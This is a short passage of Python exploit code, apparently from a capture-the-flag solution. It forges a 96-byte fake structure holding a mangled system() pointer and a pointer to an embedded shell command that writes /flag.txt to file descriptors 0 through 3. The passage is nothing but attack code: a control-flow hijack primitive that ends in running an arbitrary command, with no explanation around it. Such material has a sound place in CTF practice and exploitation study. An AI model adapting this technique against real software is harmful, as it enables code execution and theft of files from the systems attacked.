...
fake=bytearray(96); struct.pack_into('<Q',fake,0,0); struct.pack_into('<Q',fake,8,1); struct.pack_into('<I',fake,16,4); struct.pack_into('<Q',fake,24,mangled_sys); struct.pack_into('<Q',fake,32,target+0x30); struct.pack_into('<Q',fake,40,0); fake[48:96]=b'for i in 0 1 2 3;do cat /flag.txt>&$i;done\x00'
